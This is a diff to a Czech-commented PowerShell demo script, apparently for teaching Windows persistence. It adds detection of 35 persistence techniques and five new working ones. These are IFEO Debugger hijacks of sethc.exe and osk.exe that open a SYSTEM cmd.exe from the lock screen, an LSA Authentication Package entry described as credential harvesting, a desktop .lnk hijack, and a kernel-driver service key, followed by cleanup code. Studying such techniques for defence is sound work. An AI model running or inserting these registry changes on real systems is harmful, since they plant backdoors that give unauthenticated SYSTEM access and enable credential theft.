@@ -44,6 +44,144 @@ function Log-Action {
     }
 }
 
+# Detekce stavu persistence technik
+function Get-PersistenceStatus {
+    $status = @{}
+    
+    # 1) Service
+    $status[1] = (Get-Service -Name "Demo" -ErrorAction SilentlyContinue) -ne $null
+    
+    # 2) Startup (user)
+    $status[2] = Test-Path (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd")
+    
+    # 3) Startup (all users)
+    $status[3] = Test-Path (Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd")
+    
+    # 4) Run HKCU
+    $status[4] = $null -ne (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue)
+    
+    # 5) Run HKLM
+    $status[5] = $null -ne (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue)
+    
+    # 6) Run HKLM WOW6432Node
+    $status[6] = $null -ne (Get-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue)
+    
+    # 7) Scheduled Task 30min
+    $status[7] = $null -ne (Get-ScheduledTask -TaskName "Demo30MinTask" -ErrorAction SilentlyContinue)
+    
+    # 8) IFEO charmap
+    $status[8] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
+    
+    # 9) WMI Filter+Consumer
+    $filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "DetektorOdhalovaniNapadeni" }
+    $status[9] = $null -ne $filter
+    
+    # 10) Logon Script
+    $status[10] = $null -ne (Get-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue)
+    
+    # 11) AppInit_DLLs
+    $appInit = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -ErrorAction SilentlyContinue)."AppInit_DLLs"
+    $status[11] = ($appInit -and $appInit -ne "")
+    
+    # 12) Screensaver
+    $status[12] = $null -ne (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue)."SCRNSAVE.EXE" -and (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue)."SCRNSAVE.EXE" -eq "cmd.exe"
+    
+    # 13) Office Test
+    $status[13] = Test-Path "HKCU:\Software\Microsoft\Office test\Special\Perf"
+    
+    # 14) Winlogon Shell
+    $shell = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -ErrorAction SilentlyContinue).Shell
+    $status[14] = ($shell -and $shell -ne "explorer.exe")
+    
+    # 15) RunOnce HKCU
+    $status[15] = $null -ne (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue)
+    
+    # 16) RunOnce HKLM
+    $status[16] = $null -ne (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue)
+    
+    # 17) PowerShell Profile
+    $profilePath = $PROFILE.CurrentUserAllHosts
+    if (Test-Path $profilePath) {
+        $content = Get-Content $profilePath -Raw -ErrorAction SilentlyContinue
+        $status[17] = $content -match 'DEMO_PERSISTENCE_MARKER'
+    } else {
+        $status[17] = $false
+    }
+    
+    # 18) COM Hijacking
+    $status[18] = Test-Path "HKCU:\Software\Classes\CLSID\{DEADBEEF-1234-5678-9ABC-DEF012345678}"
+    
+    # 19) Utilman IFEO
+    $status[19] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
+    
+    # 20) Netsh Helper
+    $status[20] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Netsh" -Name "demo" -ErrorAction SilentlyContinue)
+    
+    # 21) BITS Job
+    try {
+        $bitsOutput = & bitsadmin /list /allusers 2>&1 | Out-String
+        $status[21] = $bitsOutput -match "DemoBitsJob"
+    } catch {
+        $status[21] = $false
+    }
+    
+    # 22) Winlogon Userinit
+    $userinit = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
+    $status[22] = ($userinit -and $userinit -ne "C:\Windows\system32\userinit.exe,")
+    
+    # 23) Scheduled Task Lock Screen
+    $status[23] = $null -ne (Get-ScheduledTask -TaskName "DemoLockScreenTask" -ErrorAction SilentlyContinue)
+    
+    # 24) Active Setup
+    $status[24] = Test-Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{FEEDFACE-1234-5678-9ABC-DEF012345678}"
+    
+    # 25) AppCertDLLs
+    $status[25] = $null -ne (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" -Name "demo" -ErrorAction SilentlyContinue)
+    
+    # 26) Print Port Monitor
+    $status[26] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\DemoMonitor"
+    
+    # 27) Time Provider
+    $status[27] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DemoProvider"
+    
+    # 28) SSP
+    $secPackages = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -ErrorAction SilentlyContinue)."Security Packages"
+    $status[28] = ($secPackages -contains "demo_ssp")
+    
+    # 29) Silent Process Exit
+    $status[29] = Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
+    
+    # 30) File Association
+    $status[30] = Test-Path "HKCU:\Software\Classes\.demopers"
+    
+    # 31) sethc.exe IFEO
+    $status[31] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
+    
+    # 32) osk.exe IFEO
+    $status[32] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
+    
+    # 33) LSA Authentication Package
+    $authPackages = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
+    $status[33] = ($authPackages -contains "demo_auth")
+    
+    # 34) .lnk Shortcut hijack
+    $status[34] = Test-Path (Join-Path ([Environment]::GetFolderPath("Desktop")) "DemoShortcut.lnk")
+    
+    # 35) Kernel Driver
+    $status[35] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver"
+    
+    return $status
+}
+
+function Format-Status {
+    param([bool]$enabled)
+    if ($enabled) {
+        return "[ON] " 
+    } else {
+        return "[OFF]"
+    }
+}
+
 function Show-Menu {
     Clear-Host
     Write-Host "==========================================================" -ForegroundColor Cyan
@@ -54,39 +192,48 @@ function Show-Menu {
     Write-Host "Vyberte techniku persistence, kterou chcete demonstrovat:" -ForegroundColor Yellow
     Write-Host "==========================================================" -ForegroundColor Cyan
     Write-Host ""
+    
+    # Ziskej aktualni stavy
+    $st = Get-PersistenceStatus
+    
     Write-Host "--- Uzivatelska uroven (bez admin prav) ---" -ForegroundColor Green
-    Write-Host "  2) Startup slozka (vlastni profil)"
-    Write-Host "  4) Run klic (HKCU)"
-    Write-Host "  7) Planovana uloha (kazdych 30 minut)"
-    Write-Host " 10) Logon Script (UserInitMprLogonScript)"
-    Write-Host " 12) Screensaver (SCRNSAVE.EXE)"
-    Write-Host " 13) Office Test klic"
-    Write-Host " 15) RunOnce klic (HKCU)"
-    Write-Host " 17) PowerShell Profile (CurrentUser)"
-    Write-Host " 18) COM Hijacking (HKCU CLSID)"
-    Write-Host " 23) Planovana uloha spustena PRI ZAMKNUTI OBRAZOVKY (aha demo)" -ForegroundColor Magenta
-    Write-Host " 30) File Association Hijack (.demopers -> cmd.exe)"
+    Write-Host "  2) $(Format-Status $st[2]) Startup slozka (vlastni profil)"
+    Write-Host "  4) $(Format-Status $st[4]) Run klic (HKCU)"
+    Write-Host "  7) $(Format-Status $st[7]) Planovana uloha (kazdych 30 minut)"
+    Write-Host " 10) $(Format-Status $st[10]) Logon Script (UserInitMprLogonScript)"
+    Write-Host " 12) $(Format-Status $st[12]) Screensaver (SCRNSAVE.EXE)"
+    Write-Host " 13) $(Format-Status $st[13]) Office Test klic"
+    Write-Host " 15) $(Format-Status $st[15]) RunOnce klic (HKCU)"
+    Write-Host " 17) $(Format-Status $st[17]) PowerShell Profile (CurrentUser)"
+    Write-Host " 18) $(Format-Status $st[18]) COM Hijacking (HKCU CLSID)"
+    Write-Host " 23) $(Format-Status $st[23]) Planovana uloha spustena PRI ZAMKNUTI OBRAZOVKY (aha demo)" -ForegroundColor Magenta
+    Write-Host " 30) $(Format-Status $st[30]) File Association Hijack (.demopers -> cmd.exe)"
+    Write-Host " 34) $(Format-Status $st[34]) Shortcut Modification (.lnk hijack)"
     Write-Host ""
     Write-Host "--- Systemova uroven (vyzaduje admin) ---" -ForegroundColor Yellow
-    Write-Host "  1) Sluzba (Service)"
-    Write-Host "  3) Startup slozka (vsichni uzivatele)"
-    Write-Host "  5) Run klic (HKLM)"
-    Write-Host "  6) Run klic (HKLM WOW6432Node - 32-bit)"
-    Write-Host "  8) Debugger IFEO (charmap.exe)"
-    Write-Host "  9) WMI Event Filter + Consumer"
-    Write-Host " 11) AppInit_DLLs"
-    Write-Host " 14) Winlogon Shell"
-    Write-Host " 16) RunOnce klic (HKLM)"
-    Write-Host " 19) Utilman / Sticky Keys hijack (IFEO)" -ForegroundColor Red
-    Write-Host " 20) Netsh Helper DLL"
-    Write-Host " 21) BITS Job (notify command)"
-    Write-Host " 22) Winlogon Userinit"
-    Write-Host " 24) Active Setup (per-user first logon)"
-    Write-Host " 25) AppCertDLLs (system-wide DLL na CreateProcess)"
-    Write-Host " 26) Print Port Monitor (spoolsv DLL)"
-    Write-Host " 27) Time Provider (W32Time DLL)"
-    Write-Host " 28) Security Support Provider (LSA - POZOR)" -ForegroundColor Red
-    Write-Host " 29) Silent Process Exit (notepad close - aha demo 2)" -ForegroundColor Magenta
+    Write-Host "  1) $(Format-Status $st[1]) Sluzba (Service)"
+    Write-Host "  3) $(Format-Status $st[3]) Startup slozka (vsichni uzivatele)"
+    Write-Host "  5) $(Format-Status $st[5]) Run klic (HKLM)"
+    Write-Host "  6) $(Format-Status $st[6]) Run klic (HKLM WOW6432Node - 32-bit)"
+    Write-Host "  8) $(Format-Status $st[8]) Debugger IFEO (charmap.exe)"
+    Write-Host "  9) $(Format-Status $st[9]) WMI Event Filter + Consumer"
+    Write-Host " 11) $(Format-Status $st[11]) AppInit_DLLs"
+    Write-Host " 14) $(Format-Status $st[14]) Winlogon Shell"
+    Write-Host " 16) $(Format-Status $st[16]) RunOnce klic (HKLM)"
+    Write-Host " 19) $(Format-Status $st[19]) Utilman / Sticky Keys hijack (IFEO)" -ForegroundColor Red
+    Write-Host " 20) $(Format-Status $st[20]) Netsh Helper DLL"
+    Write-Host " 21) $(Format-Status $st[21]) BITS Job (notify command)"
+    Write-Host " 22) $(Format-Status $st[22]) Winlogon Userinit"
+    Write-Host " 24) $(Format-Status $st[24]) Active Setup (per-user first logon)"
+    Write-Host " 25) $(Format-Status $st[25]) AppCertDLLs (system-wide DLL na CreateProcess)"
+    Write-Host " 26) $(Format-Status $st[26]) Print Port Monitor (spoolsv DLL)"
+    Write-Host " 27) $(Format-Status $st[27]) Time Provider (W32Time DLL)"
+    Write-Host " 28) $(Format-Status $st[28]) Security Support Provider (LSA - POZOR)" -ForegroundColor Red
+    Write-Host " 29) $(Format-Status $st[29]) Silent Process Exit (notepad close - aha demo 2)" -ForegroundColor Magenta
+    Write-Host " 31) $(Format-Status $st[31]) Sethc.exe Hijack (Sticky Keys - 5x Shift)" -ForegroundColor Red
+    Write-Host " 32) $(Format-Status $st[32]) OSK.exe Hijack (On-Screen Keyboard)" -ForegroundColor Red
+    Write-Host " 33) $(Format-Status $st[33]) LSA Authentication Package" -ForegroundColor Red
+    Write-Host " 35) $(Format-Status $st[35]) Kernel Driver Persistence (Type=1 Service)" -ForegroundColor Red
     Write-Host ""
     Write-Host "--- Ostatni ---" -ForegroundColor Cyan
     Write-Host " 90) Restartovat skript jako Administrator (UAC prompt)" -ForegroundColor Yellow
@@ -638,6 +785,101 @@ do {
             Write-Host "TIP: otevrete '$testFile' dvojklikem v Exploreru - spusti se cmd.exe s cestou k souboru jako argument." -ForegroundColor Cyan
             Log-Action "Added file association hijack for .demopers -> cmd.exe; test file: $testFile"
         }
+        31 {
+            # sethc.exe Hijack (Sticky Keys) - IFEO Debugger method
+            # 5x Shift na lock screenu spusti cmd.exe pod SYSTEM
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Sethc.exe Hijack (Sticky Keys - 5x Shift)."
+            Write-Host "POZOR: Umoznuje spustit cmd.exe pod SYSTEM z lock screenu stisknutim 5x Shift!" -ForegroundColor Red
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
+            Write-Host "Pridano: IFEO Debugger for sethc.exe -> cmd.exe" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri stisknuti 5x Shift (Sticky Keys prompt) - funguje i na lock screenu!" -ForegroundColor Yellow
+            Write-Host "Pouziti: klasicka post-exploitation technika - SYSTEM shell z lock screenu bez prihlaseni." -ForegroundColor Yellow
+            Write-Host "TIP: Stisknte 5x Shift na lock screenu - objevi se cmd.exe pod SYSTEM uctem." -ForegroundColor Cyan
+            Log-Action "Added IFEO Debugger for sethc.exe -> cmd.exe (Sticky Keys hijack)"
+        }
+        32 {
+            # osk.exe Hijack (On-Screen Keyboard) - IFEO Debugger method
+            if (-not (Require-Administrator)) { break }
+            Write-Host "OSK.exe Hijack (On-Screen Keyboard)."
+            Write-Host "POZOR: Umoznuje spustit cmd.exe pod SYSTEM z lock screenu pres Ease of Access -> OSK!" -ForegroundColor Red
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
+            Write-Host "Pridano: IFEO Debugger for osk.exe -> cmd.exe" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri kliknuti na On-Screen Keyboard (OSK) na lock screenu." -ForegroundColor Yellow
+            Write-Host "Pouziti: alternativa k Utilman/Sethc - mene caste monitorovana accessibility feature." -ForegroundColor Yellow
+            Log-Action "Added IFEO Debugger for osk.exe -> cmd.exe (On-Screen Keyboard hijack)"
+        }
+        33 {
+            # LSA Authentication Package - credential harvesting persistence
+            if (-not (Require-Administrator)) { break }
+            Write-Host "LSA Authentication Package."
+            Write-Host "POZOR: Uprava Authentication Packages je VELMI RIZIKOVA - muze rozbit autentizaci systemu!" -ForegroundColor Red
+            Write-Host "Demo pouze prida neexistujici nazev - LSASS ho preskoci a zaloguje warning." -ForegroundColor Yellow
+            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+            try {
+                $current = (Get-ItemProperty -Path $regPath -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
+                if (-not $current) { $current = @() }
+                if ($current -notcontains "demo_auth") {
+                    $new = @($current) + "demo_auth"
+                    Set-ItemProperty -Path $regPath -Name "Authentication Packages" -Value $new -Force | Out-Null
+                }
+                Write-Host "Pridano: 'demo_auth' do MULTI_SZ hodnoty 'Authentication Packages'." -ForegroundColor Green
+                Write-Host "Kdy se spousti: pri startu systemu - LSASS nacte vsechny auth packages (demo_auth.dll neexistuje -> log warning)." -ForegroundColor Yellow
+                Write-Host "Pouziti: SYSTEM-level credential harvesting - DLL dostane pristup k plaintext passwordum pri autentizaci." -ForegroundColor Yellow
+                Write-Host "Detekce: hodnota Authentication Packages v registru, System event log." -ForegroundColor Yellow
+                Log-Action "Appended 'demo_auth' to LSA Authentication Packages"
+            } catch {
+                Write-Host "Chyba pri uprave Authentication Packages: $_" -ForegroundColor Red
+                Log-Action "ERROR modifying Authentication Packages: $_"
+            }
+        }
+        34 {
+            # Shortcut (.lnk) Modification - Desktop/Taskbar hijack
+            Write-Host "Shortcut Modification - .lnk Hijacking."
+            $testLnkPath = Join-Path ([Environment]::GetFolderPath("Desktop")) "DemoShortcut.lnk"
+            try {
+                $WshShell = New-Object -ComObject WScript.Shell
+                $Shortcut = $WshShell.CreateShortcut($testLnkPath)
+                $Shortcut.TargetPath = "cmd.exe"
+                $Shortcut.Arguments = '/k echo Shortcut hijack spustena! Tento shortcut puvodni aplikaci nespusti, ale cmd.exe.'
+                $Shortcut.WorkingDirectory = "C:\Windows\System32"
+                $Shortcut.WindowStyle = 1
+                $Shortcut.Description = "Demo persistence via .lnk modification - Hack3r.cz"
+                $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,21"
+                $Shortcut.Save()
+                Write-Host "Pridano: Desktop shortcut '$testLnkPath' -> Target: cmd.exe" -ForegroundColor Green
+                Write-Host "Kdy se spousti: kdyz uzivatel klikne na shortcut (Desktop, Taskbar, Start Menu)." -ForegroundColor Yellow
+                Write-Host "Pouziti: velmi nenападne - hijack existujicich shortcutu (Chrome, Outlook, Word) -> uzivatel nevidi rozdil." -ForegroundColor Yellow
+                Write-Host "TIP: kliknete na 'DemoShortcut' na Desktopu - spusti se cmd.exe misto puvodni aplikace." -ForegroundColor Cyan
+                Log-Action "Created hijacked .lnk shortcut: $testLnkPath -> cmd.exe"
+            } catch {
+                Write-Host "Chyba pri vytvareni .lnk: $_" -ForegroundColor Red
+                Log-Action "ERROR creating .lnk shortcut: $_"
+            }
+        }
+        35 {
+            # Kernel Driver Persistence - Type=1 Service (vyžaduje testsigning nebo valid signature)
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Kernel Driver Persistence (Service Type=1)."
+            Write-Host "POZOR: Kernel driver vyzaduje SIGNED driver nebo test mode (bcdedit /set testsigning on)." -ForegroundColor Red
+            Write-Host "Demo pouze vytvori registry klic (driver soubor neexistuje - system ho preskoci)." -ForegroundColor Yellow
+            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver"
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name "Type" -Value 1 -PropertyType DWord -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "Start" -Value 1 -PropertyType DWord -Force | Out-Null  # SERVICE_SYSTEM_START
+            New-ItemProperty -Path $regPath -Name "ErrorControl" -Value 1 -PropertyType DWord -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "ImagePath" -Value "\SystemRoot\System32\drivers\demo_driver.sys" -PropertyType ExpandString -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "DisplayName" -Value "Demo Kernel Driver (Educational)" -PropertyType String -Force | Out-Null
+            Write-Host "Pridano: Kernel driver service 'DemoDriver' -> ImagePath: \SystemRoot\System32\drivers\demo_driver.sys" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri startu systemu (SERVICE_SYSTEM_START) - PRED user-mode procesy." -ForegroundColor Yellow
+            Write-Host "Pouziti: rootkit-level persistence - kernel mode, neviditelne pro user-mode monitory." -ForegroundColor Yellow
+            Write-Host "Detekce: Services registry (Type=1), driver file check, bootkit scanners." -ForegroundColor Yellow
+            Log-Action "Created kernel driver service registry: DemoDriver (driver file neexistuje - demo only)"
+        }
         0 {
             Write-Host "Ukoncuji skript." -ForegroundColor Cyan
             exit
@@ -835,6 +1077,37 @@ do {
             Remove-Item -Path "HKCU:\Software\Classes\demopers.file" -Recurse -Force -ErrorAction SilentlyContinue
             Remove-Item -Path (Join-Path $env:TEMP "test.demopers") -Force -ErrorAction SilentlyContinue
             Log-Action "Removed .demopers file association and test file"
+
+            # --- Cleanup novych technik (31-35) ---
+
+            # 31 sethc.exe IFEO hijack
+            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed IFEO entry for sethc.exe"
+
+            # 32 osk.exe IFEO hijack
+            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed IFEO entry for osk.exe"
+
+            # 33 LSA Authentication Package
+            try {
+                $lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+                $current = (Get-ItemProperty -Path $lsaPath -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
+                if ($current -contains "demo_auth") {
+                    $new = @($current | Where-Object { $_ -ne "demo_auth" })
+                    Set-ItemProperty -Path $lsaPath -Name "Authentication Packages" -Value $new -Force | Out-Null
+                }
+                Log-Action "Removed 'demo_auth' from LSA Authentication Packages"
+            } catch {
+                Log-Action "ERROR cleaning Authentication Package: $_"
+            }
+
+            # 34 Shortcut hijack
+            Remove-Item -Path (Join-Path ([Environment]::GetFolderPath("Desktop")) "DemoShortcut.lnk") -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed Desktop shortcut DemoShortcut.lnk"
+
+            # 35 Kernel Driver service
+            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed kernel driver service registry: DemoDriver"
 
             Write-Host "Vsechny persistence techniky byly odstraneny."
         }
